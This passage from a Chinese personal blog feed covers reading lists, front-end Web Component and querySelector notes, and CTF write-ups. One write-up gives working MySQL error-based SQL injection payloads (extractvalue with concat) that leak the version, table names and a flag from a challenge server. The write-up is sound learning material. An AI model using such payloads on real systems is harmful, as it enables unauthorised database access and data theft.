<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>程序员的自我修养<br>逆向工程权威指南 好厚,不知道有没有时间读<br>CSAPP<br>黑客免杀攻防<br>加密与解密<br>0day安全 搞不到纸质版</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[bkctf]]></title>
      <url>/2017/05/29/bkctf/</url>
      <content type="html"><![CDATA[<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><a href="http://120.24.86.145:8004/index1.php?args=GLOBALS" target="_blank" rel="external">http://120.24.86.145:8004/index1.php?args=GLOBALS</a><br>吐血,这都要想好久,参考链接:<br><a href="http://php.net/manual/zh/reserved.variables.php" target="_blank" rel="external">http://php.net/manual/zh/reserved.variables.php</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql 报错注入]]></title>
      <url>/2017/05/28/mysql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p><a href="http://54.223.247.98:8023/" target="_blank" rel="external">http://54.223.247.98:8023/</a><br>要通过post传递参数,不然过滤很严</p>
<p>##<br>尝试</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> @<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>XPATH syntax error: ‘~5.1.73~’</p>
</blockquote>
<p>可以这样子报错注入的还有updateXML</p>
<p>爆表名</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SeleCt</span> group_concat<span class="token punctuation">(</span><span class="token keyword">distinct</span> table_name <span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">384</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>XPATH syntax error: ‘~e,flag_is_here’</p>
</blockquote>
<p>跑出来表名是<code>flag_is_here</code></p>
<p>由于extractvalue只能显示32位<br>所以这个384是我用burp跑出来的,不知道正确的姿势是什么</p>
<p>但,,当我爆字段的时候发生了尴尬的事情,,因为不能用where好像是被x了<br>所以直接从<code>information_schema.columns</code>里面爆<code>column_name</code>的时候由于有1024的限制,所以没办法得到有用的东西,因为这个<code>column_name</code>内容太多了</p>
<blockquote>
<p>这个时候应该怎么办呢</p>
</blockquote>
<p>还好这道题目字段就是<code>flag</code><br>所以这样子就能拿到结果</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">a</span><span class="token operator">=</span>article<span class="token punctuation">`</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SeleCt</span> flag <span class="token keyword">from</span> flag_is_here<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>XPATH syntax error: ‘~SYC{O0o._O0o._O0o._O0o._O0o.}~’</p>
</blockquote>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[几本值得推荐的书目]]></title>
      <url>/2017/05/26/%E5%87%A0%E6%9C%AC%E5%80%BC%E5%BE%97%E6%8E%A8%E8%8D%90%E7%9A%84%E4%B9%A6%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p>关于burpsuite <a href="https://t0data.gitbooks.io/burpsuite/" target="_blank" rel="external">https://t0data.gitbooks.io/burpsuite/</a><br>Samba远程代码执行漏洞 <a href="https://hub.docker.com/r/medicean/vulapps/" target="_blank" rel="external">https://hub.docker.com/r/medicean/vulapps/</a><br>JS函数式 <a href="https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/" target="_blank" rel="external">https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[querySelector querySelectorAll]]></title>
      <url>/2017/05/26/querySelector-querySelectorAll/</url>
      <content type="html"><![CDATA[<p>关于这个我倒是没有很大疑问</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.class'</span><span class="token punctuation">)</span>
document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.class'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>但,我们有了这个,为什么还要用jQuery呢<br>是因为效率还是因为有什么问题吗</p>
<p>另外只选择id的话不要用这个…和<code>getElementById</code>还是有性能差异的<br>直接乖乖用<code>getElementById</code>就阔以了</p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="http://www.cnblogs.com/Wayou/p/html5_web_api_queryselector.html" target="_blank" rel="external">http://www.cnblogs.com/Wayou/p/html5_web_api_queryselector.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector" target="_blank" rel="external">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector</a><br><a href="http://www.iteye.com/news/28503" target="_blank" rel="external">http://www.iteye.com/news/28503</a></p>
]]></content>
      
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Web Component]]></title>
      <url>/2017/05/26/Web-Component/</url>
      <content type="html"><![CDATA[<blockquote>
<p>好累啊..腿好酸</p>
</blockquote>
<p>看了一本书叫<code>Web Component实战</code></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><code>Web Component</code>有几个模块:<br><code>模板元素</code>,<code>Shadow DOM</code>,<code>自定义元素</code>,<code>HTML Import</code></p>
<h2 id="模板元素"><a href="#模板元素" class="headerlink" title="模板元素"></a>模板元素</h2><pre class="line-numbers language-csharp"><code class="language-csharp"><span class="token keyword">interface</span> <span class="token class-name">HTMLTemplateElement</span><span class="token punctuation">:</span> HTMLELement <span class="token punctuation">{</span>
    <span class="token keyword">readonly</span> arttribute DocumentFragment content<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>HTML Template元素的唯一一个元素content(类型为DocumentFragment)</p>
<p>检测是不是支持HTML Template</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Web Component: Template support<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
            var isTemplateSupported = function() {
                var template = document.createElement("template");
                return 'content' in template;
            }
            var isSupported = isTemplateSupported(),
                message = document.getElementById('message');
            if(isSupported) {
                message.innerHTML = "Supported";
            } else {
                message.innerHTML = "Not Supported";
            }
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>模板是<em>延迟加载</em>的,要手动激活<br>方法有两种</p>
<h4 id="cloneNode"><a href="#cloneNode" class="headerlink" title="cloneNode"></a>cloneNode</h4><pre><code>&lt;Node&gt; &lt;Target node&gt;.cloneNode(&lt;Boolean paramenter&gt;)
</code></pre><p>参数: </p>
<pre><code>- true 深克隆 目标节点的子节点也被clone
- false 浅克隆
</code></pre><p>返回值:</p>
<pre><code>- &lt;Node&gt;
</code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
        Template is activated using cloneNode.
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
    var aTemplate = document.querySelector('#aTemplate'),
    container = document.getElementById("container"),
    templateContent = aTemplate.content,
    activeContent = templateContent.cloneNode(true); //key

    container.appendChild(activeContent);
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="importNode"><a href="#importNode" class="headerlink" title="importNode"></a>importNode</h4><pre><code>&lt;Node&gt; document.importNode(&lt;target Node&gt;, &lt;Boolean parameter&gt;)
</code></pre><p>这个更像是函数式的写法</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
        Template is activated using cloneNode.
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
    var aTemplate = document.querySelector('#aTemplate'),
    container = document.getElementById("container"),
    templateContent = aTemplate.content,
    activeContent = document.importNode(templateContent, true); //key

    container.appendChild(activeContent);
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="HTML-Import"><a href="#HTML-Import" class="headerlink" title="HTML Import"></a>HTML Import</h2><p>可以像iframe一样,把外部的HTML嵌入页面</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>import<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileName.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>检测是否支持</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> isImportSupport <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> link <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string">'import'</span> <span class="token keyword">in</span> link<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问被引入的文档(通过import属性)<br>=&gt; message.html</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>This is from another HTML file document.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>=&gt; index.html</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>import<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
    (function() {
        var externalDocument = 
            document.querySelector('link[rel="import"]').import;
        var headerElement = externalDocument.querySelector('h1');
//        document.body.appendChild(headerElement);
        document.body.appendChild(headerElement.cloneNode(true));
    })();
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>原文这里也是用了<code>cloneNode</code><br>即为</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>headerElement<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但试验了一下好像直接</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>headerElement<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>也是可以的</p>
<h2 id="Shadow-DOM"><a href="#Shadow-DOM" class="headerlink" title="Shadow DOM"></a>Shadow DOM</h2><p>为了防止防止外部文档影响到Web Component,比如</p>
<ul>
<li>文档样式表</li>
<li>文档的javascript代码</li>
<li>出现重复id</li>
</ul>
<p>Shadow DOM 相当于把web Component封装起来,不受外部作用域影响</p>
<p>检测是否</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> isShadowDOMSupported <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'createShadowRoot'</span> <span class="token keyword">in</span> document<span class="token punctuation">.</span>body
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h5 id="Shadow-tree"><a href="#Shadow-tree" class="headerlink" title="Shadow tree"></a>Shadow tree</h5><p>可以把一个Shadow tree 挂到某个DOM元素上,这个元素就作为宿主元素</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>aShadowHost<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 挂载点 --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>selectorTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 模板 可以clone,然后丢到shadow DOM 里--></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
            <span class="token selector"><span class="token pseudo-class">:host</span> input</span><span class="token punctuation">{</span>
                <span class="token property">background</span><span class="token punctuation">:</span> lightyellow<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token selector"><span class="token pseudo-class">:host</span> <span class="token class">.labelClass</span></span><span class="token punctuation">{</span>
                <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>
            ... 省略若干html
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
        (function() {
            var aShadowHost = document.getElementById('aShadowHost');
            var shadowRoot = aShadowHost.createShadowRoot(); //重点,敲黑板,相当于给aShadowHost挂载了一颗Shadow Tree
            var TemplateContent = ... ; //此处省略把`selectorTemplate`cloneNode出来的过程
            shadowRoot.appendChild(TemplateContent); //成功把模板挂到shadowRoot下面
            // 其实可以挂很多个shadow tree
            //现在的状况
            /* div#aShadowHost
             *  /=> shadow-root
             *      /=> style
             *      /=> form
             *  /=> shadow-root 如果多createShadowRoot几次就能得到多个shadow DOM子树
             *      /=> ....
             *  /=> ....
             */
        })();
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="自定义元素"><a href="#自定义元素" class="headerlink" title="自定义元素"></a>自定义元素</h2><p>检测</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> isCustomElementSupportws <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token string">'registerElement'</span> <span class="token keyword">in</span> document<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>大概过程,具体参考MDN</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> newObj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>HTMLElement<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
Object<span class="token punctuation">.</span><span class="token function">defineProperties</span><span class="token punctuation">(</span>newObj<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    title<span class="token punctuation">:</span> <span class="token punctuation">{</span>
        writeable<span class="token punctuation">:</span><span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    country<span class="token punctuation">:</span> <span class="token punctuation">{</span>
        writeable<span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>
        value<span class="token punctuation">:</span> <span class="token string">'India'</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//定义生命周期方法(这个是不是就叫做钩子)</span>
newObj<span class="token punctuation">.</span>createCallback <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token comment" spellcheck="true">//Do-something </span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//注册元素</span>
<span class="token keyword">var</span> newTag <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">registerElement</span><span class="token punctuation">(</span><span class="token string">'Tag-name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    prototype<span class="token punctuation">:</span> newObj   <span class="token comment" spellcheck="true">// 把我们前面辛辛苦苦create出来的obj注册成功了</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Tag-name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Tag-name</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<blockquote>
<p>生命周期: created =&gt; attached =&gt; detached =&gt; attributeChanged</p>
</blockquote>
<h2 id="节点分布"><a href="#节点分布" class="headerlink" title="节点分布"></a>节点分布</h2><p>两种插入点</p>
<h3 id="content"><a href="#content" class="headerlink" title="content"></a>content</h3><p>对Shadow Host的子节点占位,反向映射Shadow Host的子节点</p>
<blockquote>
<p>这个不太好理解,看他这个例子</p>
</blockquote>
<pre><code>
</code></pre><h3 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h3><p>shadow插入点是Shadow Tree的占位符,反向映射了Shadow Tree中的元素</p>
<blockquote>
<p>哇 这个也不太好理解</p>
</blockquote>
<pre><code>
</code></pre><h3 id="然后发现了一个完整的Demo"><a href="#然后发现了一个完整的Demo" class="headerlink" title="然后发现了一个完整的Demo"></a>然后发现了一个完整的Demo</h3><blockquote>
<p>抄完这个Demo就去写作业</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
            <span class="token selector">header-element<span class="token pseudo-class">:unresolved</span></span><span class="token punctuation">{</span>
                <span class="token property">visibility</span><span class="token punctuation">:</span>hidden<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token selector">header-element<span class="token pseudo-class">:unresolved</span><span class="token pseudo-element">:after</span></span><span class="token punctuation">{</span>
                <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">'Registering Element...'</span><span class="token punctuation">;</span>
                <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
                <span class="token property">visibility</span><span class="token punctuation">:</span>visible<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>headerTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">
                <span class="token selector"><span class="token pseudo-class">:host</span></span><span class="token punctuation">{</span>
                    <span class="token property">text-transform</span><span class="token punctuation">:</span>lowercase<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token selector"><span class="token pseudo-class">:host</span><span class="token pseudo-element">::shadow</span> h1</span><span class="token punctuation">{</span>
                    <span class="token property">color</span><span class="token punctuation">:</span>orange<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token selector"><span class="token pseudo-class">:host</span><span class="token pseudo-element">::content</span> b</span><span class="token punctuation">{</span>
                    <span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Hello <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>content</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>content</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
